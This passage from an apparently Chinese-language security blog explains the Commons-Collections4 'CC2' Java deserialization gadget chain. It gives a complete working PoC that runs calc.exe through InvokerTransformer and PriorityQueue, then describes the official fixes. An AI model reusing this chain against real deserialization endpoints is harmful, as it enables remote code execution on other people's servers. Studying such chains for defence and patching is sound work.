class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"calc.exe\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>fakeTransformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>再创建一个 TransformingComparator, 传入我们的 Transformer:</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">PrirotyQuene</span> quene <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PriorityQuene</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>comparator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>quene<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>quene<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>实例化 PriorityQueue 对象，第⼀个参数是初始化时的⼤⼩，⾄少需要 2 个元素才会触发排序和⽐较，</p>\n<p>所以是 2；第⼆个参数是⽐较时的 Comparator，传⼊前⾯实例化的 comparator：</p>\n<p>得加上两个点，不然不会排列触发这个 headpify 函数</p>\n<p>再将假的 payload 改成真的</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>transformerChain<span class=\"token punctuation\">,</span> <span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">,</span> transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> fieldName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Field</span> field <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span>fieldName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后就是序列化反序列化 readObject 方法了：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span>ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>完整的 poc：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">myapp</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Comparator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PriorityQueue</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections4<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections4<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections4<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections4<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections4<span class=\"token punctuation\">.</span>comparators<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransformingComparator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> acc2 <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> fieldName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Field</span> field <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span>fieldName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        field<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> fakeTransformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                        <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"calc.exe\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>fakeTransformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token class-name\">Comparator</span> comparator <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token class-name\">TransformingComparator</span><span class=\"token punctuation\">(</span>transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token class-name\">PriorityQueue</span> queue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> comparator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        queue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        queue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>transformerChain<span class=\"token punctuation\">,</span> <span class=\"token string\">\"iTransformers\"</span><span class=\"token punctuation\">,</span> transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token class-name\">ByteArrayOutputStream</span> barr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>                <span class=\"token class-name\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>barr<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">)</span>ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505251854414.png\" alt=\"image-20250525185440144\" /></p>\n<p>也是弹计算器了</p>\n<p>弹两次计算器是因为</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505251855219.png\" alt=\"image-20250525185540146\" /></p>\n<p>这里有两个 transfrom 都会触发一次计算器</p>\n<h3 id=\"官方修复方法\"><a class=\"anchor\" href=\"#官方修复方法\">#</a> 官方修复方法：</h3>\n<p>在 Commons-Collections3 中不能使用 priorityQuene 利用链，原因是类 org.apache.commons.collections4.comparators.TransformingComparator 在 4.0 之前的版本是没有实现 serializable 接口的，无法在序列化中使用</p>\n<h4 id=\"通过增加黑名单的方式修复\"><a class=\"anchor\" href=\"#通过增加黑名单的方式修复\">#</a> 通过增加黑名单的方式修复：</h4>\n<p>新版的代码中增加了一个方法</p>\n<p>FunctorUtils#checkUnsafeSerialization, 用于检测反序列化是否安全，如果开发者没有设置全局配置 org.apache.commons.collections.enableUnsafeSerialization=true, 即默认情况下会抛出异常。</p>\n<p>这个检查在常见的危险 Transformer 类（InstantiateTransformer 、 InvokerTransformer、PrototypeFactory 、CloneTransformer 等）的 readObject 里进行调用，所以，当我们反序列化包含这些对象是就会抛出一个异常：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202505252021153.png\" alt=\"image-20250525202129922\" /></p>\n<p>再看 4.1，修复的方式有不一样，在 4.1 里面，这几个危险 Transformer 类不再实现 Serializable 接口，也就是说，他们几个 cedilla 五发序列化和反序列化了。</p>\n<h3 id=\"小结\"><a class=\"anchor\" href=\"#小结\">#</a> 小结：</h3>\n<p><strong>cc2 链只能存在于 commons-collections4.0 里面</strong></p>\n<h2 id=\"commonsbeanutils与无commons-collections的shiro反序列化利用\"><a class=\"anchor\" href=\"#commonsbeanutils与无commons-collections的shiro反序列化利用\">#</a> CommonsBeanutils 与无 commons-collections 的 Shiro 反序列化利用</h2>\n<p>在前文中，我们认识了 java.util.PriorityQueue, 他在 java 中是一个优先队列，队列中每一个元素有自己的而有限即，在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作 ，而排序就设计到大小比较，进而执行 java.util.Comparator 接口的 compare () 